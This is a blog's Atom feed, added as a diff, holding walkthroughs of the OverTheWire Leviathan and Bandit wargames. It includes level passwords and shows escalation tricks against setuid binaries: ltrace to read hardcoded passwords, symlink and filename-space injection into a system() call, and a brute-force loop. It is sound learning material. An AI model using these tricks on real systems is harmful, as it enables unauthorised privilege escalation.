@@ -1,0 +1,1968 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: wargames | Core dump overflow]]></title>
+  <link href="http://chousensha.github.io/blog/categories/wargames/atom.xml" rel="self"/>
+  <link href="http://chousensha.github.io/"/>
+  <updated>2015-08-03T14:05:34+03:00</updated>
+  <id>http://chousensha.github.io/</id>
+  <author>
+    <name><![CDATA[chousensha]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[OverTheWire: Leviathan]]></title>
+    <link href="http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan/"/>
+    <updated>2015-07-30T17:01:22+03:00</updated>
+    <id>http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan</id>
+    <content type="html"><![CDATA[<p>The next step in difficulty for the OverTheWire wargames is Leviathan. From the description:</p>
+
+<blockquote><p>This wargame doesn&rsquo;t require any knowledge about programming &ndash; just a bit of common sense and some knowledge about basic *nix commands.</p></blockquote>
+
+<p>Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on <strong>leviathan.labs.overthewire.org</strong> through SSH.</p>
+
+<p>To login to the first level use:</p>
+
+<p>Username: leviathan0</p>
+
+<p>Password: leviathan0</p>
+
+<p>Data for the levels can be found in the homedirectories.</p>
+
+<!-- more -->
+
+
+<h3>Level 0 &ndash;> Level 1</h3>
+
+<p>There is no information about what you have to do for each level to progress, so you just have to look around.</p>
+
+<p>If you do a <em>ls -la</em> in the home directory, you will see an interesting hidden directory owned by leviathan1:</p>
+
+<p><code>plain
+leviathan0@melinda:~$ ls -la
+total 24
+drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
+drwxr-x---   2 leviathan1 leviathan0 4096 Jul 17 16:44 .backup
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+</code></p>
+
+<p>Inside there is a bookmarks.html file with lots of links, so I tried grepping for the word password and wasn&rsquo;t disappointed:</p>
+
+<p><code>plain
+leviathan0@melinda:~/.backup$ cat bookmarks.html  | grep password
+&lt;DT&gt;&lt;A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"&gt;password to leviathan1&lt;/A&gt;
+</code></p>
+
+<h3>Level 1 &ndash;> Level 2</h3>
+
+<p>There is a setuid binary in the home folder that asks for a password. Running <em>strings</em> on it didn&rsquo;t reveal much, except that it uses <em>strcmp</em>..so it compares the input it receives with something..</p>
+
+<p>I solved this by running <em>ltrace</em> on the binary. <em>ltrace</em> is a library call tracer:</p>
+
+<blockquote><p>ltrace  is  a  program  that simply runs the specified command until it
+exits.  It intercepts and records the dynamic library calls  which  are
+called  by  the  executed process and the signals which are received by
+ that process.  It can also intercept and print the  system  calls  executed by the program.</p></blockquote>
+
+<p><code>plain
+leviathan1@melinda:~$ ltrace ./check
+__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 &lt;unfinished ...&gt;
+printf("password: ")                                                                        = 10
+getchar(0x8048680, 47, 0x804a000, 0x8048642password: abcd
+)                                                = 97
+getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 98
+getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 99
+strcmp("abc", "sex")                                                                        = -1
+puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
+)                                                        = 29
++++ exited (status 0) +++
+</code></p>
+
+<p>In the <em>ltrace</em> output you can actually see the password that your input is compared with. Give it to the program and you will get a shell as leviathan2:</p>
+
+<p><code>plain
+leviathan1@melinda:~$ ./check
+password: sex
+$ whoami
+leviathan2
+</code></p>
+
+<p>As in the previous wargame, look in <em>/etc/</em> for the password:</p>
+
+<p><code>plain
+$ cat /etc/leviathan_pass/leviathan2
+ougahZi8Ta
+</code></p>
+
+<h3>Level 2 &ndash;> Level 3</h3>
+
+<p>In this level we have another setuid binary named printfile. If you try to read the password file for the next level you just get a message that you an&rsquo;t have that file:</p>
+
+<p><code>plain
+leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+</code></p>
+
+<p>Running <em>ltrace</em> again we see the <em>access</em> system call is being used:</p>
+
+<p><code>plain
+leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3   
+__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
+access("/etc/leviathan_pass/leviathan3", 4)                                                 = -1
+puts("You cant have that file..."You cant have that file...
+)                                                          = 27
++++ exited (status 1) +++
+</code></p>
+
+<p>This is good news, because <em>access</em> is vulnerable to race conditions, as can be seen from its man page:</p>
+
+<blockquote><p>access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.</p>
+
+<p>The check is done using the calling process&rsquo;s real UID and GID,  rather than the effective IDs as is done when actually attempting an operation
+(e.g., open(2)) on the file.  This allows set-user-ID programs to  easily determine the invoking user&rsquo;s authority.</p>
+
+<p>Warning: Using access() to check if a user is authorized to, for  example, open a file before actually doing so using open(2) creates a security
+hole, because the user  might  exploit  the  short  time  interval between  checking and opening the file to manipulate it. For this reason, the   > use of this system call should be avoided.</p></blockquote>
+
+<p>A more detailed description from <a href="https://www.owasp.org/index.php/File_Access_Race_Condition:_TOCTOU">OWASP</a>:</p>
+
+<blockquote><p>The window of time between when a file property is checked and when the file is used can be exploited to launch a privilege escalation attack.</p>
+
+<p>File access race conditions, known as time-of-check, time-of-use (TOCTOU) race conditions, occur when:</p>
+
+<p>The program checks a property of a file, referencing the file by name.
+The program later performs a filesystem operation using the same filename and assumes that the previously-checked property still holds.</p></blockquote>
+
+<p>The first thing I thought was to create a file and make it a symlink to the password file, but it didn&rsquo;t work. So I just made a random file for test purposes and used <em>ltrace</em> again to see what is happening when accessing it:</p>
+
+<p><code>plain
+leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/readme
+__libc_start_main(0x804852d, 2, 0xffffd784, 0x8048600 &lt;unfinished ...&gt;
+access("/tmp/baka/readme", 4)                                                               = 0
+snprintf("/bin/cat /tmp/baka/readme", 511, "/bin/cat %s", "/tmp/baka/readme")               = 25
+system("/bin/cat /tmp/baka/readme"test
+ &lt;no return ...&gt;
+--- SIGCHLD (Child exited) ---
+&lt;... system resumed&gt; )                                                                      = 0
++++ exited (status 0) +++
+</code></p>
+
+<p>I have to say, I used help for this one, because it wasn&rsquo;t clear to me on how to proceed (it&rsquo;s also where I got stuck when I first attempted this wargame). If <em>access</em> returns successfully, it will <em>cat</em> the file that was passed to it (and it&rsquo;s actually <em>snprintf</em> that does the <em>cat</em>. Remember from Bandit how <em>cat</em> won&rsquo;t print files with spaces in their names, unless the spaces are escaped or the filename is surrounded by quotes. I made a new dummy file with a space in its name:</p>
+
+<p><code>plain
+leviathan2@melinda:/tmp/baka$ cat space\ file
+test
+leviathan2@melinda:/tmp/baka$ cat space file
+cat: space: No such file or directory
+cat: file: No such file or directory
+</code></p>
+
+<p>Now I ran <em>ltrace</em> again and tried to print this new file:</p>
+
+<p><code>plain
+leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/space\ file
+__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &lt;unfinished ...&gt;
+access("/tmp/baka/space file", 4)                                                           = 0
+snprintf("/bin/cat /tmp/baka/space file", 511, "/bin/cat %s", "/tmp/baka/space file")       = 29
+system("/bin/cat /tmp/baka/space file"/bin/cat: /tmp/baka/space: No such file or directory
+/bin/cat: file: No such file or directory
+ &lt;no return ...&gt;
+--- SIGCHLD (Child exited) ---
+&lt;... system resumed&gt; )                                                                      = 256
++++ exited (status 0) +++
+</code></p>
+
+<p>There is a discrepancy between <em>access</em>, which checks the path of the file, and what <em>cat</em> tries to print, two different files that don&rsquo;t exist, <em>space</em> and <em>file</em> (because the space isn&rsquo;t seen as part of the filename, but as a separator between arguments):</p>
+
+<ul>
+<li><p><em>cat</em> tries /tmp/baka/space</p></li>
+<li><p><em>cat</em> tries file</p></li>
+</ul>
+
+
+<p>This is where the symbolic link exploitation part comes in place. It didn&rsquo;t work before, but if I now create a symlink to the password file and name it <em>space</em>, it will match the first half of the file that <em>cat</em> will try to print:</p>
+
+<p><code>plain
+leviathan2@melinda:/tmp/baka$ ls -l
+total 8
+-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 12:18 readme
+lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 31 15:45 space -&gt; /etc/leviathan_pass/leviathan3
+-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 15:01 space file
+</code></p>
+
+<p>And now I run <em>printfile</em> again:</p>
+
+<p><code>plain
+leviathan2@melinda:~$ ./printfile /tmp/baka/'space file'
+Ahdiemoo1j
+/bin/cat: file: No such file or directory
+</code></p>
+
+<p>Yay! It worked! Because <em>cat</em> first tried to print <em>space</em>, it followed the symlink with the same name and printed the password!</p>
+
+<h3>Level 3 &ndash;> Level 4</h3>
+
+<p>And another setuid binary! Running <em>strings</em> on it revealed it&rsquo;s a program that gives you a shell if you enter the right password. Along with string names such as do_stuff, nothing and morenothing xD</p>
+
+<p><em>ltrace</em> keeps helping a lot with these challenges:</p>
+
+<p><code>plain
+leviathan3@melinda:~$ ltrace ./level3
+__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &lt;unfinished ...&gt;
+strcmp("h0no33", "kakaka")                                                                  = -1
+printf("Enter the password&gt; ")                                                              = 20
+fgets(Enter the password&gt; huh
+"huh\n", 256, 0xf7fcac20)                                                             = 0xffffd58c
+strcmp("huh\n", "snlprintf\n")                                                              = -1
+puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
+)                                                                  = 19
++++ exited (status 0) +++
+</code></p>
+
+<p>The first <em>strcmp</em> doesn&rsquo;t seem to be used for anything, but the second one is interesting. It compares the given input with..snlprintf?! There is no such function in the C library, so I assumed it&rsquo;s just a string..and:</p>
+
+<p><code>plain
+leviathan3@melinda:~$ ./level3
+Enter the password&gt; snlprintf
+[You've got shell]!
+$ whoami
+leviathan4
+$ cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+</code></p>
+
+<p>Awesome! On to the next level!</p>
+
+<h3>Level 4 &ndash;> Level 5</h3>
+
+<p>There is a hidden directory in the home folder:</p>
+
+<p><code>plain
+leviathan4@melinda:~$ ls -la
+total 24
+drwxr-xr-x   3 root root       4096 Nov 14  2014 .
+drwxr-xr-x 167 root root       4096 Jul  9 16:27 ..
+-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root root        675 Apr  9  2014 .profile
+dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash
+</code></p>
+
+<p>Inside there&rsquo;s a program that gives some binary output when run:</p>
+
+<p><code>plain
+leviathan4@melinda:~/.trash$ ./bin
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+</code></p>
+
+<p>Convert it to Ascii for the password: <code>Tith4cokei</code></p>
+
+<h3>Level 5 &ndash;> Level 6</h3>
+
+<p>Another binary! If you run it, it says it can&rsquo;t find a file:</p>
+
+<p><code>plain
+leviathan5@melinda:~$ ./leviathan5
+Cannot find /tmp/file.log
+</code></p>
+
+<p>This is a setuid binary, so maybe we can trick it into reading the password file for the leviathan5 user. I made a symlink to the password file with the name of the missing file, and the binary followed it right to the password:</p>
+
+<p><code>plain
+leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@melinda:~$ ./leviathan5
+UgaoFee4li
+</code></p>
+
+<h3>Level 6 &ndash;> Level 7</h3>
+
+<p>And yet another binary! This one asks for a 4-digit code:</p>
+
+<p><code>plain
+leviathan6@melinda:~$ ./leviathan6
+usage: ./leviathan6 &lt;4 digit code&gt;
+</code></p>
+
+<p>Lookint at the strings, it seems this program will give us a shell if we can find the right code. I was going to use Python again but I found a quick and easy way to bruteforce the code with a very small Bash script:</p>
+
+<p>``` bash</p>
+
+<h1>!/bin/bash</h1>
+
+<p>for i in {0000..9999}
+do
+echo &lsquo;Trying&rsquo; $i
+~/leviathan6 $i
+done
+```</p>
+
+<p>This script iterates over the range of possible codes and tries each of them as input for the leviathan6 binary:</p>
+
+<p><code>plain
+...
+Trying 7122
+Wrong
+Trying 7123
+$ whoami
+leviathan7
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+</code></p>
+
+<h3>Level 7 &ndash;> Level 8</h3>
+
+<p>This is the final level, as you can see from the congratulatory note:</p>
+
+<p><code>plain
+leviathan7@melinda:~$ ls
+CONGRATULATIONS
+leviathan7@melinda:~$ cat CONGRATULATIONS
+Well Done, you seem to have used a *nix system before, now try something more serious.
+(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
+</code></p>
+
+<p>Better skip over that last line&hellip;</p>
+
+<p>``` plain</p>
+
+<hr />
+
+<p>/ Tomorrow will be cancelled due to lack \
+\ of interest.                           /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[OverTheWire: Bandit]]></title>
+    <link href="http://chousensha.github.io/blog/2015/06/22/overthewire-bandit/"/>
+    <updated>2015-06-22T20:11:18+03:00</updated>
+    <id>http://chousensha.github.io/blog/2015/06/22/overthewire-bandit</id>
+    <content type="html"><![CDATA[<p>I&rsquo;ve completed this and some other wargames before starting a blog, but I thought I should revisit them and do a proper walkthrough, and that would also help me organize my notes beyond one-liners that I no longer know what they were for :D So, going to start with Bandit, which is the most basic and beginner friendly of the OverTheWire wargames. You can look at each level&rsquo;s page for a list of commands that you may need to solve it and some additional reading material that might help in better understanding what&rsquo;s going on. I will also give <em>man</em> pages descriptions for the commands I&rsquo;ll use to complete the levels.</p>
+
+<!-- more -->
+
+
+<h3>Level 0</h3>
+
+<p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.</p>
+
+<h3>Level 0 &ndash;> Level 1</h3>
+
+<p>The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH to log into that level and continue the game.</p>
+
+<p>``` plain
+ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x62;&#97;&#110;&#100;&#105;&#116;&#x30;&#x40;&#x62;&#x61;&#x6e;&#100;&#105;&#116;&#46;&#x6c;&#x61;&#98;&#115;&#x2e;&#x6f;&#118;&#x65;&#x72;&#116;&#104;&#101;&#x77;&#x69;&#114;&#x65;&#46;&#111;&#114;&#103;">&#98;&#97;&#110;&#x64;&#x69;&#x74;&#x30;&#x40;&#x62;&#x61;&#x6e;&#100;&#105;&#x74;&#x2e;&#x6c;&#97;&#x62;&#x73;&#46;&#x6f;&#x76;&#101;&#x72;&#116;&#104;&#101;&#x77;&#105;&#114;&#x65;&#46;&#111;&#x72;&#103;</a>
+Welcome to the OverTheWire games machine !</p>
+
+<p>Please read /README.txt for more information on how to play the levels
+on this gameserver.</p>
+
+<p>bandit0@melinda:~$ ls
+readme
+bandit0@melinda:~$ cat readme
+boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+```</p>
+
+<p>Well, this is straightforward. The required file just lies around for the reading</p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>cat &ndash; concatenate files and print on the standard output</p></blockquote>
+
+<h3>Level 1 &ndash;> Level 2</h3>
+
+<p>The password for the next level is stored in a file called &ndash; located in the home directory</p>
+
+<p>Although filenames starting with dashes are legal in Linux, if you try to use some commands on them, the dash would get confused with command flags. If you try to <em>cat</em> it directly, <em>cat</em> will just wait for further input. The workaround is to feed <em>cat</em> the path to the file (can also be done just by using the current directory path)</p>
+
+<p>``` plain</p>
+
+<h2>bandit1@melinda:~$ ls</h2>
+
+<p>bandit1@melinda:~$ pwd
+/home/bandit1
+bandit1@melinda:~$ cat /home/bandit1/&ndash;
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+```</p>
+
+<h3>Level 2 &ndash;> Level 3</h3>
+
+<p>The password for the next level is stored in a file called spaces in this filename located in the home directory</p>
+
+<p>Spaces in filenames can be interpreted wrongly on the command line, because they may look as separators for the commands instead of literal spaces that are part of a filename, and this leads to all sorts of problems. That is why using spaces in filenames are generally avoided in Linux. If you try to <em>cat</em> the file as it is, this is what happens:</p>
+
+<p><code>plain
+bandit2@melinda:~$ ls
+spaces in this filename
+bandit2@melinda:~$ cat spaces in this filename
+cat: spaces: No such file or directory
+cat: in: No such file or directory
+cat: this: No such file or directory
+cat: filename: No such file or directory
+</code></p>
+
+<p>To solve the issue, you can either wrap the filenames in quotes or escape the spaces with backslashes, to ensure that the name of the file is passed correctly to the command (and if you use Tab completion, the shell will automatically escape them for you :D)</p>
+
+<p><code>plain
+bandit2@melinda:~$ cat 'spaces in this filename'
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+bandit2@melinda:~$ cat spaces\ in\ this\ filename
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+</code></p>
+
+<h3>Level 3 &ndash;> Level 4</h3>
+
+<p>The password for the next level is stored in a hidden file in the inhere directory.</p>
+
+<p>If you do a normal <em>ls</em>, you won&rsquo;t see anything. To see hidden files, you use the <em>-a</em> option, which stands for <em>&mdash;all</em>:</p>
+
+<p><code>plain
+bandit3@melinda:~$ ls
+inhere
+bandit3@melinda:~$ cd inhere
+bandit3@melinda:~/inhere$ ls -a
+.  ..  .hidden
+bandit3@melinda:~/inhere$ cat .hidden
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>ls &ndash; list directory contents</p>
+
+<p>-a, &mdash;all
+do not ignore entries starting with .</p></blockquote>
+
+<h3>Level 4 &ndash; Level 5</h3>
+
+<p>The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.</p>
+
+<p><code>plain
+bandit4@melinda:~/inhere$ ls
+-file00  -file02  -file04  -file06  -file08
+-file01  -file03  -file05  -file07  -file09
+bandit4@melinda:~/inhere$ cat ./-file00
+;�-i�(��z��У��ޘ�鑾
+</code></p>
+
+<p>You can try to manually <em>cat</em> each of them, until you will reach the right one:</p>
+
+<p><code>plain
+bandit4@melinda:~/inhere$ cat ./-file07
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+</code></p>
+
+<p>But what if there were hundreds of files? If you use the <em>file</em> command, you can see the difference between the files:</p>
+
+<p><code>plain
+./-file00: data
+./-file01: data
+./-file02: data
+./-file03: data
+./-file04: data
+./-file05: data
+./-file06: data
+./-file07: ASCII text
+./-file08: data
+./-file09: data
+</code></p>
+
+<p>Now you know which file to look in for the password!</p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>file — determine file type</p></blockquote>
+
+<h3>Level 5 &ndash;> Level 6</h3>
+
+<p>The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: &ndash; human-readable &ndash; 1033 bytes in size &ndash; not executable</p>
+
+<p>Well, clearly no manual work here, the directory is filled with other folders:</p>
+
+<p><code>plain
+bandit5@melinda:~/inhere$ ls
+maybehere00  maybehere04  maybehere08  maybehere12  maybehere16
+maybehere01  maybehere05  maybehere09  maybehere13  maybehere17
+maybehere02  maybehere06  maybehere10  maybehere14  maybehere18
+maybehere03  maybehere07  maybehere11  maybehere15  maybehere19
+</code></p>
+
+<p>To find the file with the required properties, we can use..<em>find</em>! It conveniently has the exact switches for what we&rsquo;re looking for:</p>
+
+<p><code>plain
+bandit5@melinda:~/inhere$ find ! -executable -readable -size 1033c
+./maybehere07/.file2
+bandit5@melinda:~/inhere/maybehere07$ cat .file2
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>find &ndash; search for files in a directory hierarchy</p>
+
+<p>-executable
+Matches files which are executable  and  directories  which  are searchable  (in  a file name resolution sense).</p>
+
+<p>-readable
+Matches  files  which  are  readable.</p>
+
+<p>-size n
+File uses n units of space.
+`c'    for bytes</p></blockquote>
+
+<h3>Level 6 &ndash;> Level 7</h3>
+
+<p>The password for the next level is stored somewhere on the server and has all of the following properties: &ndash; owned by user bandit7 &ndash; owned by group bandit6 &ndash; 33 bytes in size</p>
+
+<p>Again, <em>find</em> comes to the rescue!</p>
+
+<p><code>plain
+bandit6@melinda:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null
+/var/lib/dpkg/info/bandit7.password
+bandit6@melinda:~$ cat /var/lib/dpkg/info/bandit7.password
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>find</p>
+
+<p>-user uname</p>
+
+<p>File is owned by user uname (numeric user ID allowed).</p>
+
+<p>-group gname</p>
+
+<p>File belongs to group gname (numeric group ID allowed).</p></blockquote>
+
+<h3>Level 7 &ndash;> Level 8</h3>
+
+<p>The password for the next level is stored in the file data.txt next to the word millionth</p>
+
+<p>We can use <em>grep</em> to get the line with the millionth word and our password:</p>
+
+<p><code>plain
+bandit7@melinda:~$ cat data.txt | grep millionth
+millionth   cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>grep  searches the named input FILEs (or standard input if no files are
+named, or if a single hyphen-minus (&ndash;) is given as file name) for lines
+containing  a  match to the given PATTERN.  By default, grep prints the
+matching lines.</p></blockquote>
+
+<h3>Level 8 &ndash;> Level 9</h3>
+
+<p>The password for the next level is stored in the file data.txt and is the only line of text that occurs only once</p>
+
+<p>To get only the unique line(s), we will use some more pipe redirection:</p>
+
+<p><code>plain
+bandit8@melinda:~$ sort data.txt | uniq -u
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>sort &ndash; sort lines of text files</p>
+
+<p>uniq &ndash; report or omit repeated lines
+-u, &mdash;unique
+only print unique lines</p></blockquote>
+
+<h3>Level 9 &ndash;> Level 10</h3>
+
+<p>The password for the next level is stored in the file data.txt in one of the few human-readable strings, beginning with several ‘=’ characters.</p>
+
+<p>For this one we can use <em>strings</em> and <em>grep</em> for the = sign:</p>
+
+<p><code>plain
+bandit9@melinda:~$ strings data.txt | grep =
+epr~F=K
+7?YD=
+?M=HqAH
+/(Ne=
+C=_"
+I========== the6
+z5Y=
+`h(8=`
+n\H=;
+========== password
+========== ism
+N$=&amp;
+l/a=L)
+f=C(
+========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+ie)=5e
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>strings &ndash; print the strings of printable characters in files.</p></blockquote>
+
+<h3>Level 10 &ndash;> Level 11</h3>
+
+<p>The password for the next level is stored in the file data.txt, which contains base64 encoded data</p>
+
+<p>Luckily, there is a command-line utility just for that purpose!</p>
+
+<p><code>plain
+bandit10@melinda:~$ base64 -d data.txt
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>base64 &ndash; base64 encode/decode data and print to standard output</p>
+
+<p>-d, &mdash;decode
+decode data</p></blockquote>
+
+<h3>Level 11 &ndash;> Level 12</h3>
+
+<p>The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p>
+
+<p>If you read the ROT13 Implementation section on Wikipedia, it will actually give you a hint on how to solve this challenge and the program needed.</p>
+
+<p><code>plain
+bandit11@melinda:~$ cat data.txt | tr a-zA-Z n-za-mN-ZA-M
+The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+</code></p>
+
+<p>Because the content of the file has been rotated 13 characters, we use the <em>tr</em> command to shift it back to the original</p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>tr &ndash; translate or delete characters</p>
+
+<p>CHAR1-CHAR2
+all characters from CHAR1 to CHAR2 in ascending order</p></blockquote>
+
+<h3>Level 12 &ndash;> Level 13</h3>
+
+<p>The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)</p>
+
+<p>If you <em>cat</em> data.txt this is what you will see:</p>
+
+<p><code>plain
+bandit12@melinda:~$ cat data.txt
+0000000: 1f8b 0808 34da 6554 0203 6461 7461 322e  ....4.eT..data2.
+0000010: 6269 6e00 013f 02c0 fd42 5a68 3931 4159  bin..?...BZh91AY
+0000020: 2653 5982 c194 8a00 0019 ffff dbfb adfb  &amp;SY.............
+0000030: bbab b7d7 ffea ffcd fff7 bfbf 1feb eff9  ................
+0000040: faab 9fbf fef2 fefb bebf ffff b001 3b18  ..............;.
+0000050: 6400 001e a000 1a00 6468 0d01 a064 d000  d.......dh...d..
+0000060: 0d00 0034 00c9 a320 001a 0000 0d06 80d1  ...4... ........
+0000070: a340 01b4 98d2 3d13 ca20 6803 40d1 a340  .@....=.. h.@..@
+0000080: 1a00 0340 0d0d 0000 000d 0c80 6803 4d01  ...@........h.M.
+0000090: a3d4 d034 07a8 0683 4d0c 4034 069e 91ea  ...4....M.@4....
+00000a0: 0f50 1a1a 1ea3 40e9 ea0c 80d0 0346 87a9  .P....@......F..
+00000b0: a006 8193 4340 d320 c403 2064 00c4 000c  ....C@. .. d....
+00000c0: 8640 0d00 0d06 8340 0c9a 0068 0000 6468  .@.....@...h..dh
+00000d0: 1854 0084 0008 38c4 7c28 66b3 bf1f 366d  .T....8.|(f...6m
+00000e0: 3971 1c93 f09a 6287 0cfe 04d3 efa9 4164  9q....b.......Ad
+00000f0: 0ad1 1828 6c55 75ff 6922 dedd 8cfe 5936  ...(lUu.i"....Y6
+0000100: e351 7ae8 0590 6c01 0446 5f2a ba7e 8503  .Qz...l..F_*.~..
+0000110: a710 a38c d8c1 9781 5249 b909 8d92 5e09  ........RI....^.
+0000120: b343 32a1 9890 cc63 74f2 a3a1 f260 3afa  .C2....ct....`:.
+0000130: 4f55 cc30 f7a3 5c20 d610 a588 1ab4 543c  OU.0..\ ......T&lt;
+0000140: 71b3 d052 8980 010a b270 4112 89c4 ad7a  q..R.....pA....z
+0000150: 8386 125d a460 3a11 3da3 4949 a01f 9e7d  ...].`:.=.II...}
+0000160: 8f5e fef5 e13a 4537 dfb3 a898 92e8 cca0  .^...:E7........
+0000170: 155c fb29 d0e1 08cf 0cec 7006 b1bc 8f39  .\.)......p....9
+0000180: 51bc 1b7b e1ef 161f f020 6830 b1fd d69c  Q..{..... h0....
+0000190: e096 54a1 1a03 47ce c4f1 00c7 e520 2e02  ..T...G...... ..
+00001a0: 5577 63ac 3dc9 0f84 200a 745d 0503 f8f4  Uwc.=... .t]....
+00001b0: b9fb 1152 1c22 a410 572e 11ac cf9e 5ff6  ...R."..W....._.
+00001c0: dbf4 ef68 3010 7e36 026e aa38 19fd 4c37  ...h0.~6.n.8..L7
+00001d0: 392c a262 f646 8710 9231 4ee4 5200 c601  9,.b.F...1N.R...
+00001e0: 529a fec3 8c89 f85d 5f12 5c2f 9073 4544  R......]_.\/.sED
+00001f0: 4fed fb97 a851 f831 cd9a 69d7 e80b 12b5  O....Q.1..i.....
+0000200: fb37 ba20 86e9 92a7 78c5 5092 2bac 6269  .7. ....x.P.+.bi
+0000210: 01c7 09a1 fda4 ef8b 7c14 1832 a30f db92  ........|..2....
+0000220: d345 a9b4 de57 8996 4dc7 8ee8 b334 02b2  .E...W..M....4..
+0000230: 8dc4 a6a6 08ea c285 d28c 9f60 6779 540a  ...........`gyT.
+0000240: 2b97 5e3f f82c 1800 80f1 32b0 32d1 7724  +.^?.,....2.2.w$
+0000250: 5385 0908 2c19 48a0 d123 d96f 3f02 0000  S...,.H..#.o?...
+</code></p>
+
+<p>So, if it&rsquo;s been repeatedly compressed, than repeatedly decompressing it should do the job (this actually took an annoying time of repetitions&hellip;am I repeating the repeat word too often? :D)</p>
+
+<p><code>plain
+bandit12@melinda:~$ mkdir /tmp/mystuff
+bandit12@melinda:~$ cp data.txt /tmp/mystuff
+bandit12@melinda:~$ cd /tmp/mystuff
+</code></p>
+
+<p>To reverse the hexdump we will use <em>xxd</em>:</p>
+
+<p><code>plain
+bandit12@melinda:/tmp/mystuff$ xxd -r data.txt &gt; newdata
+</code></p>
+
+<p>Now let&rsquo;s look at it (not literally, it&rsquo;s full of garbage):</p>
+
+<p><code>plain
+bandit12@melinda:/tmp/mystuff$ file newdata
+newdata: gzip compressed data, was "data2.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
+</code></p>
+
+<p>So now we know the data file was previously a binary file and it&rsquo;s been compressed with <em>gzip</em>. This means we know how to decompress it. There are a couple ways to do it. If you want to use <em>gzip</em>, you have to rename the file with a <em>.gz</em> extension:</p>
+
+<p><code>plain
+bandit12@melinda:/tmp/mystuff$ mv newdata data2.gz
+bandit12@melinda:/tmp/mystuff$ gzip -d data3.gz
+bandit12@melinda:/tmp/mystuff$ file data3
